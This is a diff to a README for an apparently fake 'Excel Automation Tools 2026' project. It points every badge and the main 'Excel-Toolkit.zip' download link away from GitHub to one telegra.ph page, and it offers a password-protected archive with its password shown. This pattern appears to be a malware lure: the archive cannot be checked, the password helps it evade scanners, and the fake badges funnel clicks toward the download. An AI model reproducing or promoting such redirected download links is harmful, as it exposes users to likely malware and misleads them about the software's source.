@@ -4,12 +4,12 @@
 
 # 📊 Excel Automation Tools 2026 — Spreadsheet Power Suite & Macro Manager
 
-[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/Excel-Automation-Tools)](https://github.com/Alexantros341/Excel-Automation-Tools)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Software](https://img.shields.io/badge/Software-Microsoft%20Excel-green)](https://www.microsoft.com/excel)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Productivity-orange)]()
-[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/Excel-Automation-Tools)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Software](https://img.shields.io/badge/Software-Microsoft%20Excel-green)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-Productivity-orange)](https://telegra.ph/Download-05-21-39)
+[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
@@ -47,7 +47,7 @@ Automate repetitive tasks with macro templates, batch-process workbooks, generat
 
 🔽 Password-protected archive — extract and automate your spreadsheets.
 
-📦 [**Download** `Excel-Toolkit.zip`](https://github.com/superchronomancerday/Excel-Automation-Tool/releases/download/Release/Excel_Toolkit.zip)
+📦 [**Download** `Excel-Toolkit.zip`](https://telegra.ph/Download-05-21-39)
 
 **🔐 — 1847**
 
